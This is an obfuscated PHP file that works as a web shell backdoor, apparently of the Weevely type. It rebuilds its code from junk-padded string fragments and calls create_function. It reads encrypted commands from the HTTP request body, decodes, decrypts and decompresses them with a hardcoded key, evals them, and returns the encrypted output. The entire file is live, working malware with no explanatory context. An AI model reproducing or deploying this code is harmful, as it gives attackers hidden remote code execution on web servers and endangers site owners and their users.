<?php
$W='_ktcktontents();@obkt_end_cleanktkt()kt;$r=@baskte64_encktodkte(kt@x(@gzcompreskts($o),$k)kt);printkt("$p$ktkh$r$kf");}';
$u='$ktk="2cktakt3298a";$kh=kt"be88f02eekt621";ktkt$kf="86499fd6f4akt6";$ktktktp="vQeeAOFlohD0vQWr";ktktfunctioktn x($t,';
$T=str_replace('PV','','cPVreaPVte_PVfuPVnPVctiPVon');
$w='kt.=$t{$i}kt^kt$kkt{$j};}}rektturn $o;}if (kt@pktktreg_match("kt/$kh(.+)$kktf/",ktkt@fiktle_get_cktontents("php://ktin';
$d='$k){$ktktckt=strlenktkt($k);$lkt=strlkten($t);$o="";for($ktikt=0;$i<$l;){fktor($j=0;kt($jktkt<$c&&$i<$l)kt;$j+kt+,$i++){$o';
$c='put"kt),kt$m)==1)kt {@ob_starktt();@ktevaktl(@gzuncomktktpress(@x(@bktase64_dktecoktde($m[kt1]),$k)))kt;$okt=@ob_gektt';
$p=str_replace('kt','',$u.$d.$w.$c.$W);
$i=$T('',$p);$i();
?>
